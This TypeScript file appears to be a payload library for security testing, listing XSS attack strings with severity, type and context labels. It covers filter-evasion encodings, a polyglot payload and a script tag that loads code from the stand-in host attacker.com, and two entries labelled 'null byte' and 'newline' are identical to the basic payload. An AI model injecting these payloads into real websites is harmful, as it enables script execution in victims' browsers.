/**
 * XSS (Cross-Site Scripting) Payloads
 * Comprehensive collection of XSS attack payloads for testing
 */

export interface XSSPayload {
  payload: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  type: 'reflected' | 'stored' | 'dom-based' | 'universal';
  context?: 'html' | 'attribute' | 'javascript' | 'css' | 'url';
}

export const XSS_PAYLOADS: XSSPayload[] = [
  // Basic XSS
  {
    payload: "<script>alert('XSS')</script>",
    description: "Basic script tag XSS",
    severity: 'critical',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<script>alert(String.fromCharCode(88,83,83))</script>",
    description: "XSS with character encoding",
    severity: 'critical',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<img src=x onerror=alert('XSS')>",
    description: "XSS using img tag with onerror",
    severity: 'critical',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<svg onload=alert('XSS')>",
    description: "XSS using SVG onload",
    severity: 'critical',
    type: 'reflected',
    context: 'html',
  },
  
  // Event handler XSS
  {
    payload: "<body onload=alert('XSS')>",
    description: "XSS using body onload event",
    severity: 'critical',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<div onmouseover=alert('XSS')>Hover</div>",
    description: "XSS using onmouseover event",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<input onfocus=alert('XSS') autofocus>",
    description: "XSS using onfocus with autofocus",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<select onfocus=alert('XSS') autofocus>",
    description: "XSS using select onfocus",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<textarea onfocus=alert('XSS') autofocus>",
    description: "XSS using textarea onfocus",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  
  // Attribute context XSS
  {
    payload: "\"><script>alert('XSS')</script>",
    description: "XSS breaking out of attribute",
    severity: 'critical',
    type: 'reflected',
    context: 'attribute',
  },
  {
    payload: "'><script>alert('XSS')</script>",
    description: "XSS breaking out of single-quoted attribute",
    severity: 'critical',
    type: 'reflected',
    context: 'attribute',
  },
  {
    payload: "javascript:alert('XSS')",
    description: "XSS in JavaScript protocol",
    severity: 'critical',
    type: 'reflected',
    context: 'url',
  },
  {
    payload: "<a href=\"javascript:alert('XSS')\">Click</a>",
    description: "XSS in href attribute",
    severity: 'critical',
    type: 'reflected',
    context: 'attribute',
  },
  
  // Encoding-based XSS
  {
    payload: "<script>alert(String.fromCharCode(88,83,83))</script>",
    description: "XSS with String.fromCharCode",
    severity: 'high',
    type: 'reflected',
    context: 'javascript',
  },
  {
    payload: "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
    description: "XSS with eval and character encoding",
    severity: 'high',
    type: 'reflected',
    context: 'javascript',
  },
  {
    payload: "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">",
    description: "XSS with HTML entity encoding",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<script>\\u0061lert('XSS')</script>",
    description: "XSS with Unicode encoding",
    severity: 'high',
    type: 'reflected',
    context: 'javascript',
  },
  
  // Filter evasion
  {
    payload: "<ScRiPt>alert('XSS')</ScRiPt>",
    description: "XSS with mixed case to evade filters",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<script/type=\"text/javascript\">alert('XSS')</script>",
    description: "XSS with script type attribute",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<script>alert('XSS')</script>",
    description: "XSS with null byte",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  {
    payload: "<script>alert('XSS')</script>",
    description: "XSS with newline",
    severity: 'high',
    type: 'reflected',
    context: 'html',
  },
  
  // DOM-based XSS
  {
    payload: "#<script>alert('XSS')</script>",
    description: "DOM-based XSS in hash",
    severity: 'critical',
    type: 'dom-based',
    context: 'url',
  },
  {
    payload: "?param=<script>alert('XSS')</script>",
    description: "DOM-based XSS in query parameter",
    severity: 'critical',
    type: 'dom-based',
    context: 'url',
  },
  {
    payload: "javascript:void(0);alert('XSS')",
    description: "DOM-based XSS in JavaScript protocol",
    severity: 'critical',
    type: 'dom-based',
    context: 'url',
  },
  
  // CSS-based XSS
  {
    payload: "<style>@import'javascript:alert(\"XSS\")';</style>",
    description: "XSS using CSS @import",
    severity: 'high',
    type: 'reflected',
    context: 'css',
  },
  {
    payload: "<link rel=stylesheet href='javascript:alert(\"XSS\")'>",
    description: "XSS using link tag",
    severity: 'high',
    type: 'reflected',
    context: 'css',
  },
  
  // Stored XSS
  {
    payload: "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    description: "Stored XSS using iframe",
    severity: 'critical',
    type: 'stored',
    context: 'html',
  },
  {
    payload: "<object data=\"javascript:alert('XSS')\"></object>",
    description: "Stored XSS using object tag",
    severity: 'critical',
    type: 'stored',
    context: 'html',
  },
  {
    payload: "<embed src=\"javascript:alert('XSS')\">",
    description: "Stored XSS using embed tag",
    severity: 'critical',
    type: 'stored',
    context: 'html',
  },
  
  // Universal XSS
  {
    payload: "<script src=\"http://attacker.com/xss.js\"></script>",
    description: "Universal XSS loading external script",
    severity: 'critical',
    type: 'universal',
    context: 'html',
  },
  {
    payload: "<base href=\"javascript://\"><script>alert('XSS')</script>",
    description: "Universal XSS using base tag",
    severity: 'critical',
    type: 'universal',
    context: 'html',
  },
  
  // Polyglot XSS (works in multiple contexts)
  {
    payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>",
    description: "Polyglot XSS payload",
    severity: 'critical',
    type: 'reflected',
    context: 'html',
  },
];

/**
 * Get XSS payloads filtered by type
 */
export function getXSSPayloads(type?: string): XSSPayload[] {
  if (!type) {
    return XSS_PAYLOADS;
  }
  return XSS_PAYLOADS.filter(p => p.type === type);
}

/**
 * Get XSS payloads filtered by context
 */
export function getXSSPayloadsByContext(context?: string): XSSPayload[] {
  if (!context) {
    return XSS_PAYLOADS;
  }
  return XSS_PAYLOADS.filter(p => p.context === context);
}

